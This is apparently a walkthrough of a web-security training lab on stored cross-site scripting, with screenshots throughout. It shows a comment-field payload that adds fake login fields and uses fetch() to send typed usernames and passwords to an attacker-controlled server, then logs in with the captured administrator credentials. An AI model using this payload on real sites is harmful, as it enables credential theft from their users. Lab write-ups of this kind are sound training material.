<img width="760" height="556" alt="image" src="https://github.com/user-attachments/assets/ce7da0cd-fcc8-4bb1-80b1-0c4af80bb133" />**XSS || Lab #15 Exploiting cross-site scripting to capture passwords**

<img width="697" height="625" alt="image" src="https://github.com/user-attachments/assets/e08a4900-b81f-4bb8-bf8b-0db1f6f4b9dd" />

Goal of this Lab is to exfiltrate username and password of a simulated user and login into the users account.

As per Lab description we have to use Burp Collaborator’s default public server. This feature is only available in the Professional version of Burp suite. I don’t have Professional version of Burp so I will be putting screen shots.

Lets start the Lab

<img width="1100" height="745" alt="image" src="https://github.com/user-attachments/assets/01a25c6d-a2e8-47f3-a15d-888ea6e38454" />

Now, the 1st thing we need to check if any of the parameter could be vulnerable to XSS. We can put a string in the parameter and see if it reflected back to us or potentially even interacting with the document object model (DOM).

When we view any post there is a feature the post comments. Lets check

<img width="882" height="658" alt="image" src="https://github.com/user-attachments/assets/2f38ca54-92ea-4b79-abcb-eea0731660b0" />

<img width="925" height="372" alt="image" src="https://github.com/user-attachments/assets/c362ecf3-4f37-4fa0-abea-fb7c7599e130" />

<img width="931" height="559" alt="image" src="https://github.com/user-attachments/assets/1b7a032f-0b12-45f6-a079-495fcde68271" />

We can see that Name field (test1) is reflected back to us. Also test1 is a hyperlink it means website field also got reflected back. And comment field is reflected back as well.

So we need to check all these three field for XSS vulnerability.

Lets start with comment field and check if its vulnerable to XSS

***<script>console.log(“hello!!”)</script>***

Its a simple script that output a string in the web console

Now if the comment field is not vulnerable to XSS, the application will take it like a string and it will be displayed in the comment section.

However if its vulnerable to XSS, there will no comment and we will get a hello!! printed in the console panel of the developers tool.

<img width="792" height="697" alt="image" src="https://github.com/user-attachments/assets/9fbce9d7-a29a-426a-9669-7735387d32c9" />

<img width="798" height="676" alt="image" src="https://github.com/user-attachments/assets/80eba903-a0f5-4503-8e16-44370cddd9c2" />

Now, we don’t see our script is displayed here. It means that its get executed as a code. Lets validate

<img width="1100" height="342" alt="image" src="https://github.com/user-attachments/assets/6e3bcaaf-f182-4d48-b384-8d98b069e239" />

We can see that hello!! got printed in the Console tab of the Developers tool. So definitely comment filed is vulnerable to XSS.

Now, we will add a username and password field in the comment section. When anyone will post a comment, they feel like they have to login first.

They will put their username and password and it will be sent to the attacker-controlled server.

Lets write a script to add a username and password filed.

&lt;input name=username id=username&gt;

<input type=password name=password onchange=”if(this.value.length) fetch(‘Link of the attacker-controlled server’ ,

{

method: ‘POST’ ,

mode: ‘no-cors’ ,

body: username.value+’:’+this.value

});”>

This code will present the user with a username and password field. When user will put his username and password, it will trigger the onchange event and the code will run.

if(this.value.length) >> It the length of the password filed changes or bigger than 0, then fetch () will executed and it will send a request to attacker-controlled server. The request type will be POST and in the body of the request will contain the value that was put in the username field and +this.value will put the password. Also the username and password will be separated via :

mode: ‘no-cors’ → It will not output any error when browser will try to get a response of the PORT request it will send to the attacker-controlled server.

For attacker-controlled server, we will use Burp collaborator feature in the Burp which is only available in the Professional version.

<img width="1014" height="702" alt="image" src="https://github.com/user-attachments/assets/a052a608-f4bb-4ead-8830-b5e242091315" />

<img width="987" height="697" alt="image" src="https://github.com/user-attachments/assets/95591594-0408-4fea-9492-0dab3f283b1c" />

And paste in the script

<img width="790" height="184" alt="image" src="https://github.com/user-attachments/assets/b2f58439-d9a5-4ece-8e33-bf4503ca7429" />

Lets put this script in the comment of the post

<img width="760" height="556" alt="image" src="https://github.com/user-attachments/assets/81618b6a-a8f7-4845-bdc1-30e1b0c2a2bb" />

And post the comment.

<img width="780" height="502" alt="image" src="https://github.com/user-attachments/assets/f3b7607d-0946-4f4f-b00e-8d77ab98d7da" />

We can see that there are two new fields. One for username and one for the password.

In the real world these fields will not be this basic.

Now, lets wait for simulated user to put its credentials.

<img width="1092" height="898" alt="image" src="https://github.com/user-attachments/assets/700a1d55-7e03-4e24-97e0-2b4bde96bbc7" />

We can see that there is a HTTP request coming from IP 34.253.173.2

The body of this request should have credentials of a user

<img width="1083" height="685" alt="image" src="https://github.com/user-attachments/assets/3af8b502-7ba0-4381-b954-02b15d7a9998" />

We got the credentials of the administrator. Lets login

<img width="859" height="403" alt="image" src="https://github.com/user-attachments/assets/6fd455f3-727f-4ef3-8226-85a008059803" />

And Lab is solved !!!!
